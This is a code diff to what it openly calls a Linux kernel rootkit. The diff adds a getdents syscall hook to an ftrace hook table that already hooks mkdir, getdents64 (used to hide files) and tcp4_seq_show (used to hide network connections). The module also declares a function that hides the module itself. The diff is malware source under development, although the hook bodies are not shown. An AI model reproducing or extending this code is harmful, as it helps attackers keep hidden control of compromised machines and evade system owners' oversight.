@@ -33,6 +33,12 @@ static struct file_operations rootkit_fo = {
 static struct list_head *module_prev;
 static struct list_head *kobj_prev;
 
+struct linux_dirent {
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen; // the length of this entry
+	char		d_name[1]; 
+};
 // 模块隐藏
 static void hide_myself(void);
 
@@ -50,6 +56,10 @@ asmlinkage long hook_mkdir(const struct pt_regs *);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 asmlinkage long hook_getdents64(const struct pt_regs *);
 
+// getdents函数
+static asmlinkage long (*orig_getdents)(const struct pt_regs *);
+asmlinkage long hook_getdents(const struct pt_regs *);
+
 // tcp4_seq_show
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *, void *);
 asmlinkage long hook_tcp4_seq_show(struct seq_file *, void *);
@@ -58,7 +68,9 @@ asmlinkage long hook_tcp4_seq_show(struct seq_file *, void *);
 struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show)};
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents)
+    };
 
 // char *file_name = {"getroot", "getroot.c"};
 // 内核链表
